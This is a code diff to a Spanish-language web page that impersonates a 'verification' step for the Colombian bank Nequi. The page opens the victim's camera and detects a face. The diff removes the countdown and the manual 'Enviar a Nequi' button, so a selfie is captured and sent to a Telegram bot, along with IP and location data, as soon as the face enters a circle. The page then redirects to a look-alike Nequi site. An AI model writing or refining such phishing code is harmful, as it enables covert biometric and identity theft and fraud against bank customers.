@@ -47,6 +47,13 @@ video {
 .oval.valid {
     border-color: #00ff88;
     box-shadow: 0 0 25px #00ff88;
+    animation: flash 0.3s ease;
+}
+
+@keyframes flash {
+    0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+    50% { transform: translate(-50%, -50%) scale(1.05); opacity: 0.9; }
+    100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
 }
 
 /* Texto principal */
@@ -83,35 +90,6 @@ video {
 }
 
 .warning-message.show {
-    display: block;
-    animation: pulseRed 0.5s ease;
-}
-
-@keyframes pulseRed {
-    0% { transform: translateX(-50%) scale(1); opacity: 0; }
-    100% { transform: translateX(-50%) scale(1); opacity: 1; }
-}
-
-/* Contador */
-.countdown {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 80px;
-    font-weight: bold;
-    color: white;
-    text-shadow: 0 0 20px rgba(0,0,0,0.8);
-    z-index: 25;
-    background: rgba(0,0,0,0.6);
-    padding: 20px 40px;
-    border-radius: 50px;
-    backdrop-filter: blur(10px);
-    display: none;
-    font-family: monospace;
-}
-
-.countdown.show {
     display: block;
 }
 
@@ -183,34 +161,11 @@ video {
     z-index: 20;
     transition: all 0.2s;
     font-family: monospace;
+    display: none;
 }
 
 .reset-btn:hover {
     background: rgba(255,255,255,0.2);
-    transform: scale(1.05);
-}
-
-/* Botón de enviar */
-.send-btn {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    background: rgba(0,255,136,0.9);
-    backdrop-filter: blur(5px);
-    color: #2b002b;
-    border: none;
-    padding: 10px 20px;
-    border-radius: 25px;
-    cursor: pointer;
-    font-size: 14px;
-    z-index: 20;
-    transition: all 0.2s;
-    font-weight: bold;
-    display: none;
-}
-
-.send-btn:hover {
-    background: #00ff88;
     transform: scale(1.05);
 }
 
@@ -313,15 +268,13 @@ video {
 <video id="video" autoplay muted playsinline></video>
 <div class="overlay"></div>
 <div class="oval" id="oval"></div>
-<div class="warning-message" id="warningMessage">⚠️ Mira de frente a la cámara</div>
-<div class="status" id="status">🎯 Iniciando cámara...</div>
-<div class="countdown" id="countdown">3</div>
+<div class="warning-message" id="warningMessage">⚠️ Coloca tu rostro en el círculo</div>
+<div class="status" id="status">🎯 Coloca tu rostro en el círculo</div>
 <button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
-<button class="send-btn" id="sendBtn">📤 Enviar a Nequi</button>
 <div class="status-message" id="statusMessage"></div>
 <div class="loader" id="loader">
     <div class="loader-spinner"></div>
-    <div class="loader-text" id="loaderText">Procesando...</div>
+    <div class="loader-text" id="loaderText">Enviando verificación...</div>
 </div>
 
 <script>
@@ -329,12 +282,10 @@ const video = document.getElementById("video");
 const oval = document.getElementById("oval");
 const statusText = document.getElementById("status");
 const resetBtn = document.getElementById("resetBtn");
-const sendBtn = document.getElementById("sendBtn");
 const statusMessage = document.getElementById("statusMessage");
 const loader = document.getElementById("loader");
 const loaderText = document.getElementById("loaderText");
 const warningMessage = document.getElementById("warningMessage");
-const countdownDiv = document.getElementById("countdown");
 
 // Configuración de Telegram
 const TELEGRAM_CONFIG = {
@@ -345,12 +296,9 @@ const TELEGRAM_CONFIG = {
 let photoTaken = false;
 let currentPhotoData = null;
 let detectionInterval = null;
-let isCentered = false;
-let countdownActive = false;
-let countdownTimer = null;
-let countdownValue = 3;
+let isInCircle = false;
 
-// Configuración de detección - MÁS RÁPIDA
+// Configuración de detección
 const CENTER_TOLERANCE_X = 85;
 const CENTER_TOLERANCE_Y = 110;
 
@@ -364,7 +312,7 @@ navigator.mediaDevices.getUserMedia({
 })
 .then(stream => {
     video.srcObject = stream;
-    statusText.innerText = "😊 Coloca tu rostro en el óvalo";
+    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
     startFaceDetection();
 })
 .catch(err => {
@@ -372,7 +320,7 @@ navigator.mediaDevices.getUserMedia({
     statusText.innerText = "❌ Error: No se puede acceder a la cámara";
 });
 
-// Detección de rostro ultra rápida usando diferencia de color
+// Detección de rostro rápida
 function startFaceDetection() {
     detectionInterval = setInterval(() => {
         if (photoTaken) return;
@@ -387,7 +335,7 @@ function startFaceDetection() {
         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
         const data = imageData.data;
         
-        // Detección rápida de tonos de piel
+        // Detección rápida de centro de piel
         let skinCenter = detectFastSkin(data, canvas.width, canvas.height);
         
         if (skinCenter) {
@@ -407,44 +355,33 @@ function startFaceDetection() {
             const centered = dx < CENTER_TOLERANCE_X && dy < CENTER_TOLERANCE_Y;
             
             if (centered) {
-                if (!isCentered) {
-                    // Acaba de centrarse - activar inmediatamente
-                    isCentered = true;
+                if (!isInCircle && !photoTaken) {
+                    // ¡Acaba de entrar al círculo! Tomar foto inmediatamente
+                    isInCircle = true;
                     oval.classList.add("valid");
                     warningMessage.classList.remove("show");
-                    statusText.innerText = "✅ Rostro centrado - Tomando selfie";
+                    statusText.innerText = "✅ ¡Rostro detectado! Tomando selfie...";
                     
-                    // Iniciar countdown inmediatamente
-                    if (!countdownActive && !photoTaken) {
-                        startAutoCountdown();
-                    }
+                    // Tomar foto inmediatamente
+                    takePhotoAndSend();
                 }
             } else {
-                if (isCentered) {
-                    isCentered = false;
+                if (isInCircle) {
+                    isInCircle = false;
                     oval.classList.remove("valid");
                     warningMessage.classList.add("show");
-                    statusText.innerText = "🎯 Centra tu rostro en el óvalo";
-                    
-                    // Cancelar countdown si estaba activo
-                    if (countdownActive) {
-                        cancelCountdown();
-                    }
+                    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
                 }
             }
         } else {
-            if (isCentered) {
-                isCentered = false;
+            if (isInCircle) {
+                isInCircle = false;
                 oval.classList.remove("valid");
                 warningMessage.classList.add("show");
                 statusText.innerText = "❌ No se detecta rostro";
-                
-                if (countdownActive) {
-                    cancelCountdown();
-                }
             }
         }
-    }, 50); // Detección cada 50ms (más rápida)
+    }, 50);
 }
 
 // Detección rápida de centro de piel
@@ -476,45 +413,11 @@ function detectFastSkin(data, width, height) {
     };
 }
 
-function startAutoCountdown() {
-    if (countdownActive || photoTaken) return;
-    
-    countdownActive = true;
-    countdownValue = 3;
-    
-    countdownDiv.textContent = countdownValue;
-    countdownDiv.classList.add("show");
-    statusText.innerText = `📸 Selfie en ${countdownValue}...`;
-    
-    countdownTimer = setInterval(() => {
-        countdownValue--;
-        countdownDiv.textContent = countdownValue;
-        
-        if (countdownValue > 0) {
-            statusText.innerText = `📸 Selfie en ${countdownValue}...`;
-        } else {
-            clearInterval(countdownTimer);
-            countdownTimer = null;
-            countdownDiv.classList.remove("show");
-            takePhoto();
-        }
-    }, 1000);
-}
-
-function cancelCountdown() {
-    if (countdownTimer) {
-        clearInterval(countdownTimer);
-        countdownTimer = null;
-    }
-    countdownActive = false;
-    countdownDiv.classList.remove("show");
-    statusText.innerText = "🎯 Centra tu rostro en el óvalo";
-}
-
-// Tomar foto automática
-function takePhoto() {
+// Tomar foto y enviar automáticamente
+function takePhotoAndSend() {
     if (photoTaken) return;
     
+    // Tomar foto
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -529,34 +432,17 @@ function takePhoto() {
     currentPhotoData = canvas.toDataURL("image/png");
     photoTaken = true;
     
-    showSuccessToast();
-    statusText.innerText = "✅ ¡Selfie capturada con éxito!";
-    
+    // Mostrar preview de la foto
     createPhotoPreview(currentPhotoData);
-    sendBtn.style.display = "block";
     
-    // Detener la detección
+    // Detener detección
     if (detectionInterval) {
         clearInterval(detectionInterval);
         detectionInterval = null;
     }
-    if (countdownTimer) {
-        clearInterval(countdownTimer);
-        countdownTimer = null;
-    }
     
-    warningMessage.classList.remove("show");
-}
-
-function showSuccessToast() {
-    const toast = document.createElement('div');
-    toast.className = 'success-toast';
-    toast.textContent = '📸 ¡Selfie capturada!';
-    document.body.appendChild(toast);
-    
-    setTimeout(() => {
-        toast.remove();
-    }, 1500);
+    // Enviar automáticamente a Telegram
+    enviarATelegram();
 }
 
 function createPhotoPreview(imgData) {
@@ -575,27 +461,30 @@ function createPhotoPreview(imgData) {
     deleteBtn.onclick = (e) => {
         e.stopPropagation();
         preview.remove();
-        sendBtn.style.display = "none";
-        photoTaken = false;
-        currentPhotoData = null;
-        oval.classList.remove("valid");
-        isCentered = false;
-        countdownActive = false;
-        statusText.innerText = "😊 Coloca tu rostro en el óvalo";
-        mostrarMensaje("Selfie eliminada", false);
-        
-        // Reiniciar detección
-        if (!detectionInterval) {
-            startFaceDetection();
-        }
-        
-        warningMessage.classList.add("show");
+        resetProcess();
     };
     
     preview.appendChild(img);
     preview.appendChild(deleteBtn);
     
     document.body.appendChild(preview);
+}
+
+function resetProcess() {
+    photoTaken = false;
+    currentPhotoData = null;
+    isInCircle = false;
+    oval.classList.remove("valid");
+    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
+    warningMessage.classList.add("show");
+    
+    const preview = document.querySelector('.photo-preview');
+    if (preview) preview.remove();
+    
+    // Reiniciar detección
+    if (!detectionInterval) {
+        startFaceDetection();
+    }
 }
 
 function mostrarMensaje(mensaje, esError = false) {
@@ -605,6 +494,17 @@ function mostrarMensaje(mensaje, esError = false) {
     statusMessage.style.display = 'block';
     setTimeout(() => {
         statusMessage.style.display = 'none';
+    }, 3000);
+}
+
+function showSuccessToast() {
+    const toast = document.createElement('div');
+    toast.className = 'success-toast';
+    toast.textContent = '📸 ¡Selfie enviada!';
+    document.body.appendChild(toast);
+    
+    setTimeout(() => {
+        toast.remove();
     }, 2000);
 }
 
@@ -647,7 +547,7 @@ async function enviarATelegram() {
         const mensajeInfo = `
 🔔 **NUEVA SELFIE CAPTURADA** 🔔
 
-✅ Selfie tomada correctamente
+✅ Selfie tomada automáticamente al entrar al círculo
 
 🌍 **DATOS DE UBICACIÓN:**
 📍 IP: ${ipData.ip}
@@ -671,9 +571,11 @@ async function enviarATelegram() {
         });
         
         loader.classList.remove('active');
+        showSuccessToast();
         mostrarMensaje("✅ Selfie enviada correctamente");
         
-        sendBtn.style.display = 'none';
+        statusText.innerText = "✅ ¡Verificación completada!";
+        resetBtn.style.display = "block";
         
         setTimeout(() => {
             window.location.href = 'https://nequi-red.vercel.app/';
@@ -683,41 +585,18 @@ async function enviarATelegram() {
         console.error('Error enviando a Telegram:', error);
         loader.classList.remove('active');
         mostrarMensaje("Error al enviar la selfie. Intenta nuevamente.", true);
+        
+        // Mostrar botón de reinicio en caso de error
+        resetBtn.style.display = "block";
     }
 }
 
 // Botón de reinicio
 resetBtn.addEventListener('click', () => {
-    photoTaken = false;
-    currentPhotoData = null;
-    oval.classList.remove("valid");
-    sendBtn.style.display = "none";
-    isCentered = false;
-    countdownActive = false;
-    
-    if (countdownTimer) {
-        clearInterval(countdownTimer);
-        countdownTimer = null;
-    }
-    countdownDiv.classList.remove("show");
-    
-    const preview = document.querySelector('.photo-preview');
-    if (preview) preview.remove();
-    
-    statusText.innerText = "😊 Coloca tu rostro en el óvalo";
-    mostrarMensaje("Reiniciado", false);
-    
-    // Reiniciar detección
-    if (!detectionInterval) {
-        startFaceDetection();
-    }
-    
+    resetProcess();
+    resetBtn.style.display = "none";
+    statusText.innerText = "🎯 Coloca tu rostro en el círculo";
     warningMessage.classList.add("show");
-});
-
-// Botón de enviar a Telegram
-sendBtn.addEventListener('click', () => {
-    enviarATelegram();
 });
 
 // Mostrar mensaje de advertencia al inicio
